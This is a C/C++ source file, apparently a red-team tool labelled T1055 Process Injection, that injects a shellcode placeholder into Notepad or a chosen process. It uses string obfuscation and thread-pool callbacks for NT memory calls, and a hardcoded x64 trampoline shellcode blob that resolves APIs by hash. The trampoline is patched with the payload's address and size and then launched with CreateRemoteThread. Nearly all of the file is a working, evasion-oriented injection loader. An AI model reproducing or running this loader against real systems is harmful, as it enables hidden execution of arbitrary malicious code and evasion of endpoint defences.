/**
Editor: Thomas X Meng
T1055 Process Injection
Custom Stack PI (remote)

Jump code example, decoy
**/
/***

*/
#include <windows.h>
#include <stdio.h>
#include <winternl.h>


typedef DWORD(WINAPI *PFN_GETLASTERROR)();
typedef void (WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);

//define SimpleSleep
void SimpleSleep(DWORD dwMilliseconds);


typedef NTSTATUS (NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
typedef VOID (NTAPI* TPPOSTWORK)(PTP_WORK);
typedef VOID (NTAPI* TPRELEASEWORK)(PTP_WORK);

typedef struct _NTALLOCATEVIRTUALMEMORY_ARGS {
    UINT_PTR pNtAllocateVirtualMemory;   // pointer to NtAllocateVirtualMemory - rax
    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
    PVOID* address;                      // PVOID *BaseAddress - rdx; ULONG_PTR ZeroBits - 0 - r8
    PSIZE_T size;                        // PSIZE_T RegionSize - r9; ULONG AllocationType - MEM_RESERVE|MEM_COMMIT = 3000 - stack pointer
    ULONG permissions;                   // ULONG Protect - PAGE_EXECUTE_READ - 0x20 - stack pointer
} NTALLOCATEVIRTUALMEMORY_ARGS, *PNTALLOCATEVIRTUALMEMORY_ARGS;

typedef struct _NTWRITEVIRTUALMEMORY_ARGS {
    UINT_PTR pNtWriteVirtualMemory;      // pointer to NtWriteVirtualMemory - rax
    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
    PVOID address;                       // PVOID BaseAddress - rdx
    PVOID buffer;                        // PVOID Buffer - r8
    SIZE_T size;                         // SIZE_T NumberOfBytesToWrite - r9
    ULONG bytesWritten;
} NTWRITEVIRTUALMEMORY_ARGS, *PNTWRITEVIRTUALMEMORY_ARGS;


typedef NTSTATUS(NTAPI* myNtTestAlert)(
    VOID
);

typedef struct _NTTESTALERT_ARGS {
    UINT_PTR pNtTestAlert;          // pointer to NtTestAlert - rax
} NTTESTALERT_ARGS, *PNTTESTALERT_ARGS;

// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ne-processthreadsapi-queue_user_apc_flags
typedef enum _QUEUE_USER_APC_FLAGS {
  QUEUE_USER_APC_FLAGS_NONE,
  QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
  QUEUE_USER_APC_CALLBACK_DATA_CONTEXT
} QUEUE_USER_APC_FLAGS;

typedef struct _NTQUEUEAPCTHREADEX_ARGS {
    UINT_PTR pNtQueueApcThreadEx;          // pointer to NtQueueApcThreadEx - rax
    HANDLE hThread;                         // HANDLE ThreadHandle - rcx
    HANDLE UserApcReserveHandle;            // HANDLE UserApcReserveHandle - rdx
    QUEUE_USER_APC_FLAGS QueueUserApcFlags; // QUEUE_USER_APC_FLAGS QueueUserApcFlags - r8
    PVOID ApcRoutine;                       // PVOID ApcRoutine - r9
    // PVOID SystemArgument1;                  // PVOID SystemArgument1 - stack pointer
    // PVOID SystemArgument2;                  // PVOID SystemArgument2 - stack pointer
    // PVOID SystemArgument3;                  // PVOID SystemArgument3 - stack pointer
} NTQUEUEAPCTHREADEX_ARGS, *PNTQUEUEAPCTHREADEX_ARGS;

typedef NTSTATUS (NTAPI *NtQueueApcThreadEx_t)(
    HANDLE ThreadHandle,
    HANDLE UserApcReserveHandle, // Additional parameter in Ex2
    QUEUE_USER_APC_FLAGS QueueUserApcFlags, // Additional parameter in Ex2
    PVOID ApcRoutine
);


extern "C" {
    VOID CALLBACK IWillBeBack(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK WriteProcessMemoryCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK NtQueueApcThreadCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK NtTestAlertCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
}



BOOL IsSystem64Bit() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) return FALSE;

    PFN_GETNATIVESYSTEMINFO pGetNativeSystemInfo = (PFN_GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
    if (!pGetNativeSystemInfo) {
        FreeLibrary(hKernel32);
        return FALSE;
    }

    BOOL bIsWow64 = FALSE;
    SYSTEM_INFO si = {0};
    pGetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) {
        bIsWow64 = TRUE;
    }

    FreeLibrary(hKernel32);
    return bIsWow64;
}

BOOL MaskCompare(const BYTE* pData, const BYTE* bMask, const char* szMask)
{
    for (; *szMask; ++szMask, ++pData, ++bMask)
        if (*szMask == 'x' && *pData != *bMask)
            return FALSE;
    return TRUE;
}

DWORD_PTR FindPattern(DWORD_PTR dwAddress, DWORD dwLen, PBYTE bMask, PCHAR szMask)
{
    for (DWORD i = 0; i < dwLen; i++)
        if (MaskCompare((PBYTE)(dwAddress + i), bMask, szMask))
            return (DWORD_PTR)(dwAddress + i);

    return 0;
}


unsigned char trampoline[] = 
"\x41\x55\xb9\xf0\x1d\xd3\xad\x41\x54\x55\x57\x56\x53\x48\x83\xec"
"\x48\xe8\x7a\x01\x00\x00\xb9\x53\x17\xe6\x70\x48\x89\xc3\xe8\x6d"
"\x01\x00\x00\x48\x89\xc6\x48\x85\xdb\x74\x56\x48\x89\xd9\xba\xda"
"\xb3\xf1\x0d\xe8\xa9\x01\x00\x00\x48\x89\xd9\xba\x97\x1b\x2e\x51"
"\x48\x89\xc7\xe8\x99\x01\x00\x00\x48\x89\xd9\xba\x8a\x90\x6b\x5b"
"\xe8\x8c\x01\x00\x00\x48\x89\xd9\xba\xb9\x90\xaf\xfb\x49\x89\xc5"
"\xe8\x7c\x01\x00\x00\x48\x89\xd9\xba\xdb\x0c\x72\x68\xe8\x6f\x01"
"\x00\x00\xba\xe7\x28\xb9\xfd\x48\x89\xd9\xe8\x62\x01\x00\x00\xeb"
"\x05\x45\x31\xed\x31\xff\x48\x85\xf6\x74\x32\xba\x37\x8c\xc5\x3f"
"\x48\x89\xf1\xe8\x49\x01\x00\x00\xba\xb2\x5a\x91\x4d\x48\x89\xf1"
"\x49\x89\xc4\xe8\x39\x01\x00\x00\xba\x4d\xff\xa9\x27\x48\x89\xf1"
"\x48\x89\xc5\xe8\x29\x01\x00\x00\x48\x89\xc3\xeb\x07\x31\xdb\x31"
"\xed\x45\x31\xe4\xba\x00\x10\x00\x00\x48\x83\xc9\xff\xff\xd7\x48"
"\x8b\x35\xaa\x01\x00\x00\x48\x8d\x44\x24\x34\x48\x83\xc9\xff\x48"
"\x89\x44\x24\x20\x41\xb9\x20\x00\x00\x00\x49\xb8\x11\x11\x11\x11"
"\x11\x11\x11\x11\x48\x89\xf2\x41\xff\xd5\x31\xc0\x48\x89\xf2\x45"
"\x31\xc9\x45\x31\xc0\x48\x8d\x4c\x24\x38\x48\x89\x44\x24\x38\x41"
"\xff\xd4\x48\x8b\x4c\x24\x38\xff\xd5\x48\x8b\x4c\x24\x38\xff\xd3"
"\xba\x00\x10\x00\x00\x48\x83\xc9\xff\xff\xd7\x48\x83\xc4\x48\x5b"
"\x5e\x5f\x5d\x41\x5c\x41\x5d\xc3\x90\x90\x90\x90\x90\x90\x90\x90"
"\x49\x89\xc9\xb8\x05\x15\x00\x00\x45\x8a\x01\x48\x85\xd2\x75\x06"
"\x45\x84\xc0\x75\x16\xc3\x45\x89\xca\x41\x29\xca\x49\x39\xd2\x73"
"\x23\x45\x84\xc0\x75\x05\x49\xff\xc1\xeb\x0a\x41\x80\xf8\x60\x76"
"\x04\x41\x83\xe8\x20\x6b\xc0\x21\x45\x0f\xb6\xc0\x49\xff\xc1\x44"
"\x01\xc0\xeb\xc4\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x57\x56\x48\x89\xce\x53\x48\x83\xec\x20\x65\x48\x8b\x04\x25\x60"
"\x00\x00\x00\x48\x8b\x40\x18\x48\x8b\x78\x20\x48\x89\xfb\x0f\xb7"
"\x53\x48\x48\x8b\x4b\x50\xe8\x85\xff\xff\xff\x89\xc0\x48\x39\xf0"
"\x75\x06\x48\x8b\x43\x20\xeb\x11\x48\x8b\x1b\x48\x85\xdb\x74\x05"
"\x48\x39\xdf\x75\xd9\x48\x83\xc8\xff\x48\x83\xc4\x20\x5b\x5e\x5f"
"\xc3\x41\x57\x49\x89\xd7\x41\x56\x41\x55\x41\x54\x55\x31\xed\x57"
"\x56\x53\x48\x89\xcb\x48\x83\xec\x28\x48\x63\x41\x3c\x8b\xbc\x08"
"\x88\x00\x00\x00\x48\x01\xcf\x44\x8b\x77\x20\x44\x8b\x67\x1c\x44"
"\x8b\x6f\x24\x49\x01\xce\x3b\x6f\x18\x73\x31\x89\xee\x31\xd2\x41"
"\x8b\x0c\xb6\x48\x01\xd9\xe8\x15\xff\xff\xff\x4c\x39\xf8\x75\x18"
"\x48\x01\xf6\x48\x01\xde\x42\x0f\xb7\x04\x2e\x48\x8d\x04\x83\x42"
"\x8b\x04\x20\x48\x01\xd8\xeb\x04\xff\xc5\xeb\xca\x48\x83\xc4\x28"
"\x5b\x5e\x5f\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3\x90\x90\x90"
"\x55\x48\x89\xe5\xe8\x97\xfd\xff\xff\x48\x89\xec\x5d\xc3\xe8\x00"
"\x00\x00\x00\x58\x48\x83\xe8\x05\xc3\x0f\x1f\x80\x00\x00\x00\x00"
"\x88\x88\x88\x88\x88\x88\x88\x88\xc3\x90\x90\x90\x90\x90\x90\x90"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";



int main(int argc, char *argv[]) {


    unsigned char magiccode[] = ####SHELLCODE####;


    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    DWORD pid = 0;
    char notepadPath[256] = {0};  // Initialize the buffer

    //check if pid is provided as argument: 
    if (argc > 1) {
        pid = atoi(argv[1]);
        printf("[+] PID provided: %d\n", pid);
        // get pi information from pid:
        pi.hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        pi.hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pid);
    } else {
        printf("[-] PID not provided\n");
        // Determine the correct Notepad path based on system architecture
        if (IsSystem64Bit()) {
            strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
        } else {
            strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
        }

        // Attempt to create a process with Notepad
        BOOL success = CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        if (!success) {
            MessageBox(NULL, "Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
            return 1; // Exit if unable to start Notepad
        }
        printf("[+] Notepad started with default settings.\n");
        pid = pi.dwProcessId;  
        printf("[+] notepad PID: %d\n", pid);      
    }

    // LPVOID allocatedAddress = NULL;
    PVOID allocatedAddress = NULL;

    SIZE_T allocatedsize = sizeof(magiccode);

    //print the first 8 bytes of the magiccode and the last 8 bytes:
    printf("First 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n", magiccode[0], magiccode[1], magiccode[2], magiccode[3], magiccode[4], magiccode[5], magiccode[6], magiccode[7]);
    printf("Last 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n", magiccode[sizeof(magiccode) - 8], magiccode[sizeof(magiccode) - 7], magiccode[sizeof(magiccode) - 6], magiccode[sizeof(magiccode) - 5], magiccode[sizeof(magiccode) - 4], magiccode[sizeof(magiccode) - 3], magiccode[sizeof(magiccode) - 2], magiccode[sizeof(magiccode) - 1]);
    

	const char libName[] = { 'n', 't', 'd', 'l', 'l', 0 };
	const char NtAllocateFuture[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    NTALLOCATEVIRTUALMEMORY_ARGS ntAllocateVirtualMemoryArgs = { 0 };
    ntAllocateVirtualMemoryArgs.pNtAllocateVirtualMemory = (UINT_PTR) GetProcAddress(GetModuleHandleA(libName), NtAllocateFuture);
    ntAllocateVirtualMemoryArgs.hProcess = pi.hProcess;
    ntAllocateVirtualMemoryArgs.address = &allocatedAddress;
    ntAllocateVirtualMemoryArgs.size = &allocatedsize;
    ntAllocateVirtualMemoryArgs.permissions = PAGE_READWRITE;

    /// Set workers
    FARPROC pTpAllocWork = GetProcAddress(GetModuleHandleA(libName), "TpAllocWork");
    FARPROC pTpPostWork = GetProcAddress(GetModuleHandleA(libName), "TpPostWork");
    FARPROC pTpReleaseWork = GetProcAddress(GetModuleHandleA(libName), "TpReleaseWork");

    PTP_WORK WorkReturn = NULL;
    // getchar();
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)IWillBeBack, &ntAllocateVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
    // getchar();

    printf("[*] allocatedAddress: %p\n", allocatedAddress);
    if(allocatedsize != sizeof(magiccode)) {
        printf("[*] Allocated size is not the same as magiccode size\n");
        printf("[*] Allocated size: %lu\n", allocatedsize);
        printf("[*] MagicCode size: %lu\n", sizeof(magiccode));
    }


	///Write process memory: 

    ULONG bytesWritten = 0;
    NTWRITEVIRTUALMEMORY_ARGS ntWriteVirtualMemoryArgs = { 0 };
    ntWriteVirtualMemoryArgs.pNtWriteVirtualMemory = (UINT_PTR) GetProcAddress(GetModuleHandleA(libName), "NtWriteVirtualMemory");
    ntWriteVirtualMemoryArgs.hProcess = pi.hProcess;
    ntWriteVirtualMemoryArgs.address = allocatedAddress;
    ntWriteVirtualMemoryArgs.buffer = (PVOID)magiccode;
    ntWriteVirtualMemoryArgs.size = allocatedsize;
    ntWriteVirtualMemoryArgs.bytesWritten = bytesWritten;

    // // // / Set workers

    PTP_WORK WorkReturn2 = NULL;
    // getchar();
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn2, (PTP_WORK_CALLBACK)WriteProcessMemoryCustom, &ntWriteVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn2);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn2);


    // Change protection: 
    // DWORD oldProtect;
    // bool results = VirtualProtectEx(pi.hProcess, allocatedAddress, allocatedsize, PAGE_EXECUTE_READ, &oldProtect);
    // if(results) {
    //     printf("[+] VirtualProtectEx success\n");
    // } else {
    //     DWORD error = GetLastError();
    //     printf("[-] VirtualProtectEx failed with error code %lu\n", error);
    // }


    /// Allocate space for trampoline code: 

    LPVOID trampolineAddr = NULL;
    
    SIZE_T trampolineSize = sizeof(trampoline) + SIZE_T(0x0000000000004000);
    ntAllocateVirtualMemoryArgs.address = &trampolineAddr;
    ntAllocateVirtualMemoryArgs.size = &trampolineSize;
    ntAllocateVirtualMemoryArgs.permissions = PAGE_EXECUTE_READWRITE;

    PTP_WORK WorkReturn3 = NULL;
    // getchar();
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn3, (PTP_WORK_CALLBACK)IWillBeBack, &ntAllocateVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn3);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn3);

    printf("[+] Allocated memory for trampoline in remote process\n");
    printf("[+] trampolineAddr in remote process: 0x%p\n", trampolineAddr);
    printf("[*] trampoline Size: %lu\n", trampolineSize);
    printf("[+] MagicCode size: %lu\n", sizeof(magiccode));


    LPVOID restoreExInTrampoline = (LPVOID)FindPattern((DWORD_PTR)&trampoline, trampolineSize, (PBYTE)"\x88\x88\x88\x88\x88\x88\x88\x88", (PCHAR)"xxxxxxxx");
    // LPVOID restoreExInTrampoline = (LPVOID)FindPattern((DWORD_PTR)&trampoline, trampolineSize, (PBYTE)"\x11\x11\x11\x11\x11\x11\x11\x11", (PCHAR)"xxxxxxxx");

    printf("[+] Found restoreExInTrampoline at: 0x%p\n", restoreExInTrampoline);
    memcpy(restoreExInTrampoline, &allocatedAddress, 8);
    //print the address of trampolineEx

    

    LPVOID sizeExInTrampoline = (LPVOID)FindPattern((DWORD_PTR)&trampoline, trampolineSize, (PBYTE)"\x11\x11\x11\x11\x11\x11\x11\x11", (PCHAR)"xxxxxxxx");
    printf("[+] Found sizeExInTrampoline at: 0x%p\n", sizeExInTrampoline);
    // // we need to ensure allocatedsize is of 4 bytes size, we can use memcpy to copy the 4 bytes to the trampoline:
    memcpy(sizeExInTrampoline, &allocatedsize, sizeof(SIZE_T));
    // memcpy(sizeExInTrampoline, &allocatedsize, 8);


    // Create a trampoline code with space in between. 
    PVOID trampolineEx = (BYTE*)trampolineAddr + SIZE_T(0x0000000000004000);

    ntWriteVirtualMemoryArgs.address = trampolineEx;
    ntWriteVirtualMemoryArgs.buffer = (PVOID)trampoline;
    ntWriteVirtualMemoryArgs.size = sizeof(trampoline);
    ntWriteVirtualMemoryArgs.bytesWritten = bytesWritten;

    // // // / Set workers

    WorkReturn2 = NULL;
    // getchar();
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn2, (PTP_WORK_CALLBACK)WriteProcessMemoryCustom, &ntWriteVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn2);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn2);



    // 1. Creating a remote thread in the target process to execute the magiccode
	HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)trampolineEx, NULL, 0, NULL);

    // // instead of create a remote thread point to the shellcode, it point to a random address:
    // hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)0x12345678, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("[-] CreateRemoteThread failed (%d).\n", GetLastError());
        return 0;
    } else {
        printf("[+] magiccode execution started\n");
    }

    // Wait for the magiccode to execute
    DWORD waitResult = WaitForSingleObject(pi.hProcess, INFINITE); // Use a reasonable timeout as needed
    if (waitResult == WAIT_OBJECT_0) {
        printf("[+] magiccode execution completed\n");
    } else {
        printf("[-] magiccode execution wait failed\n");
    }


    // SimpleSleep(15000000);
    // getchar();
    //// Execution end..

    return 0;
}


void SimpleSleep(DWORD dwMilliseconds)
{
    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL); // Create an unsignaled event
    if (hEvent != NULL)
    {
        WaitForSingleObjectEx(hEvent, dwMilliseconds, FALSE); // Wait for the specified duration
        CloseHandle(hEvent); // Clean up the event object
    }
}